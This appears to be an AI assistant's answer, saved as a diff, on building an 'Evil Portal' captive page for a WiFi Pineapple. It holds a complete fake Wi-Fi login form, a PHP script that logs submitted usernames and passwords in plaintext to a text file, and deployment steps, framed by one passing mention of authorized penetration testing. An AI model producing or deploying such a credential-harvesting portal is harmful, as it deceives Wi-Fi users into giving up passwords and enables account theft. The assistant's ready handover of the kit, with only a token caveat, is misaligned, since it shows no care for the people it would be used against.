@@ -1,0 +1,39 @@
+Submitting Values (Frontend: index.html)The frontend uses a standard HTML <form> element. The key components are the action attribute (which points to your processing script) and the name attributes on the inputs (which act as keys for the data).html<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Wi-Fi Authentication</title>
+</head>
+<body>
+    <h2>Log in to the Network</h2>
+    <!-- The action specifies where to send the data; method must be POST -->
+    <form action="auth.php" method="POST">
+        <label for="user">Username/Email:</label>
+        <input type="text" id="user" name="username" required><br><br>
+
+        <label for="pass">Password:</label>
+        <input type="password" id="pass" name="password" required><br><br>
+
+        <input type="submit" value="Connect">
+    </form>
+</body>
+</html>
+Use code with caution.2. Receiving and Logging Values (Backend: auth.php)When the user clicks "Connect," the web server executes auth.php. This script retrieves the values from the global $_POST superarray using the name attributes defined in the HTML form.During an authorized penetration test or audit, this script usually logs the attempt to a text file and then grants internet access.php<?php
+// 1. Capture the submitted POST data safely
+$username = isset($_POST['username']) ? $_POST['username'] : 'Unknown';
+$password = isset($_POST['password']) ? $_POST['password'] : 'Unknown';
+
+// 2. Format the data for the audit log
+$logEntry = "Timestamp: " . date("Y-m-d H:i:s") . " | User: " . $username . " | Pass: " . $password . "\n";
+
+// 3. Append the data to a local text file inside the portal folder
+// Ensure the web server user has write permissions to this directory
+file_put_contents("submissions.txt", $logEntry, FILE_APPEND);
+
+// 4. (Optional) Authorize the client or redirect them
+// On OpenWrt/WiFi Pineapple systems, you can trigger a system command to clear their MAC address
+// For demonstration, we simply redirect them to a confirmation screen
+header("Location: success.html");
+exit();
+?>
+Use code with caution.3. Deploying the PortalTo make this work on the WiFi Pineapple:Navigate to the Evil Portal module interface.Create a new portal directory.Place your index.html and auth.php files into that directory.Preview the portal in your browser to verify that submitting the form successfully creates and populates the submissions.txt file.Would you like to know how to use system commands in PHP to automatically authorize the user's MAC address through the firewall once they submit the form?Try without personalization
